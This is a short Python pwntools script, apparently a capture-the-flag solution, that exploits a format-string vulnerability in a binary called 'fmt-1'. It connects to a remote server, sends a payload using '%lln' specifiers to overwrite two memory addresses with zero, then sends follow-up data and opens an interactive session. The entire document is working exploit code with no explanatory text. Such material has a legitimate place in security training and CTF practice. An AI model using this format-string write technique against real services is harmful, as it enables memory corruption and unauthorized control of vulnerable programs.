from pwn import *

context.binary = 'fmt-1'
r = remote('140.110.112.77', 4002)
#r = process('fmt-1')
raw_input('debug:')
payload = '%10$llna' + '%11$llna' + p64(0x404050) + p64(0x404058) 
print(payload)
r.recvuntil('Input:')
r.send(payload)
r.recvuntil('Input:')
r.sendline(p64(0) + p64(1))
r.interactive()
